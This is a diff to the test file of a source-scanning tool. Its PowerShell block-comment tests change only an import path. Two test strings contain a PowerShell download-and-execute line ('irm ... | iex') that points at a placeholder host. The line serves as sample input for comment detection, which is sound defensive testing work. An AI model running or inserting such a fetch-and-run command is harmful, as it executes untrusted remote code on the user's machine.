@@ -116,7 +116,7 @@ class TestPowerShellBlockComments:
     """`<# ... #>` is PowerShell's block comment: a script's help and usage live there."""
 
     def test_the_block_is_a_comment_and_what_follows_is_code(self) -> None:
-        from cordon_scanner.foundation.comments import SourceComments
+        from cordon_scanner.foundation.text.comments import SourceComments
 
         text = (
             "<#\n  Usage:\n    irm https://example.invalid/r.ps1 | iex\n#>\nWrite-Output 'done'\n"
@@ -126,13 +126,13 @@ class TestPowerShellBlockComments:
         assert not SourceComments.inside_spans(spans, text.index("Write-Output"))
 
     def test_an_opener_inside_a_string_opens_nothing(self) -> None:
-        from cordon_scanner.foundation.comments import SourceComments
+        from cordon_scanner.foundation.text.comments import SourceComments
 
         text = "$s = '<# not a comment'\nirm https://example.invalid/x | iex\n"
         assert SourceComments.block_comment_spans(text, "powershell") == ()
 
     def test_c_family_blocks_are_unchanged(self) -> None:
-        from cordon_scanner.foundation.comments import SourceComments
+        from cordon_scanner.foundation.text.comments import SourceComments
 
         text = "/* a */ x();"
         assert SourceComments.block_comment_spans(text, "javascript") == ((0, 7),)
